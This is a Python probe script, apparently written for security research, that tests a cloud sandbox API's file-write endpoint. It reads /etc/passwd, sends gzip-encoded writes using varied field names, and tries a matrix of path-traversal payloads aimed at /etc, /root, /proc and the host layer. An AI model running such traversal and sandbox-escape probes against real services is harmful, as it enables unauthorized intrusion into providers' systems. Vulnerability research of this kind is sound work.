# -*- coding: utf-8 -*-
"""fs/write gzip 写原语深入: 读回验证 + 路径语义 + 穿越矩阵
W0 fs/read POST 基线 (/etc/passwd)
W1 各路径写 -> fs/read 读回 + guest find 验证
W2 字段名/编码变体
W3 路径穿越 (写宿主层?)
"""
import json, sys, time, base64, gzip
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ, BASE, TOKEN

def log(s):
    print(s, flush=True)

def run_cmd(sid, command, args, timeout_ms=30000):
    c, r = api("POST", "/v2/sandboxes/sessions/%s/cmd?teamId=%s" % (sid, TEAM),
               {"command": command, "args": args, "wait": True, "logs": True, "timeout": timeout_ms})
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try: out += json.loads(line).get('data', '')
            except Exception: pass
    return c, out

import urllib.request, urllib.error
def api_ct(method, path, raw=None, ct=None):
    req = urllib.request.Request(BASE + path, method=method)
    req.add_header('Authorization', 'Bearer ' + TOKEN)
    if ct:
        req.add_header('Content-Type', ct)
    try:
        with urllib.request.urlopen(req, data=raw, timeout=30) as r:
            return r.status, r.read().decode()[:400]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:400]

c, r = api("POST", "/v2/sandboxes?teamId=%s" % TEAM, {"projectId": PROJ, "name": "loc6"})
if c != 200:
    log('create failed: %s' % r[:200]); sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
log('loc6 sid: %s' % sid)
time.sleep(3)

# W0: fs/read POST 基线
log('')
log('===== W0 fs/read baseline =====')
c3, r3 = api('POST', '/v2/sandboxes/sessions/%s/fs/read?teamId=%s' % (sid, TEAM), {"path": "/etc/passwd"})
log('fs/read /etc/passwd -> %s len=%d | %s' % (c3, len(r3), r3[:200].replace('\n', ' ')))

# 目录结构
c2, out = run_cmd(sid, 'sh', ['-c', 'ls -la /vercel/ 2>/dev/null; echo ===; ls -la / 2>/dev/null | head -25; echo ===; ls -la /run/vercel/ 2>/dev/null; echo ===; ls -la /home/vercel-sandbox/ 2>/dev/null | head'], 30000)
log('dirs: %s' % out[:1500])

# W1: fs/write 各路径 + 读回
log('')
log('===== W1 fs/write paths + readback =====')
PW = "/v2/sandboxes/sessions/%s/fs/write?teamId=%s" % (sid, TEAM)
PR = "/v2/sandboxes/sessions/%s/fs/read?teamId=%s" % (sid, TEAM)

def w(path, field='content', val='aGVsbG8xMjM='):
    body = gzip.compress(json.dumps({field: val, "path": path}).encode())
    c3, r3 = api_ct('POST', PW, raw=body, ct='application/gzip')
    return c3, r3

def rr(path):
    c3, r3 = api('POST', PR, {"path": path})
    return c3, r3[:150].replace('\n', ' ')

cases = [
    ('/tmp/gz_a.txt', 'content', 'aGVsbG8xMjM='),
    ('gz_b.txt', 'content', 'aGVsbG8xMjM='),
    ('/vercel/sandbox/gz_c.txt', 'content', 'aGVsbG8xMjM='),
    ('/run/vercel/share/gz_d.txt', 'content', 'aGVsbG8xMjM='),
    ('/home/vercel-sandbox/gz_e.txt', 'content', 'aGVsbG8xMjM='),
    ('/tmp/gz_f.txt', 'data', 'aGVsbG8xMjM='),
    ('/tmp/gz_g.txt', 'contents', 'aGVsbG8xMjM='),
    ('/tmp/gz_h.txt', 'content', 'hello_raw'),
]
for path, field, val in cases:
    c3, r3 = w(path, field, val)
    c4, r4 = rr(path)
    log('w %-34s -> %s | readback: %s -> %s' % (path, c3, c4, r4))

# guest 内验证
c2, out = run_cmd(sid, 'sh', ['-c', 'find / -xdev -mmin -3 -type f 2>/dev/null | grep -v "/proc/" | head -30; echo ===; ls -la /tmp/gz* /vercel/sandbox/gz* /run/vercel/share/gz* /home/vercel-sandbox/gz* 2>/dev/null'], 30000)
log('find: %s' % out[:1500])

# W2: query path 变体
log('')
log('===== W2 query-path + field variants =====')
for qpath in ['/tmp/qz_a.txt', '/vercel/sandbox/qz_b.txt']:
    c3, r3 = api_ct('POST', PW + '&path=%s' % qpath, raw=gzip.compress(b'hello'), ct='application/gzip')
    c4, r4 = rr(qpath)
    log('querypath %s -> %s | readback: %s -> %s' % (qpath, c3, c4, r4))
for field in ['filePath', 'name', 'filename', 'dest', 'target', 'guestPath', 'remotePath']:
    body = gzip.compress(json.dumps({field: '/tmp/qz_%s.txt' % field, 'content': 'aGVsbG8='}).encode())
    c3, r3 = api_ct('POST', PW, raw=body, ct='application/gzip')
    c4, r4 = rr('/tmp/qz_%s.txt' % field)
    log('field %-10s -> %s | readback: %s -> %s' % (field, c3, c4, r4))

# W3: 路径穿越
log('')
log('===== W3 traversal =====')
trav = [
    ('../tz_a.txt', 'content', 'aGVsbG8='),
    ('../../tz_b.txt', 'content', 'aGVsbG8='),
    ('/../tz_c.txt', 'content', 'aGVsbG8='),
    ('/../../etc/tz_d.txt', 'content', 'aGVsbG8='),
    ('/etc/tz_e.txt', 'content', 'aGVsbG8='),
    ('/proc/1/tz_f.txt', 'content', 'aGVsbG8='),
    ('/dev/shm/tz_g.txt', 'content', 'aGVsbG8='),
    ('/root/tz_h.txt', 'content', 'aGVsbG8='),
    ('/vercel/.env.tz', 'content', 'aGVsbG8='),
]
for path, field, val in trav:
    c3, r3 = w(path, field, val)
    c4, r4 = rr(path)
    log('w %-24s -> %s | readback: %s -> %s' % (path, c3, c4, r4))
c2, out = run_cmd(sid, 'sh', ['-c', 'find / -xdev -name "tz_*" -o -name "gz_*" -o -name "qz_*" 2>/dev/null | grep -v proc | head -20; echo ===; ls -la /etc/tz* /root/tz* /vercel/.env* 2>/dev/null'], 30000)
log('find2: %s' % out[:1200])

api("DELETE", "/v2/sandboxes/loc6?teamId=%s&projectId=%s" % (TEAM, PROJ))
log('DONE')
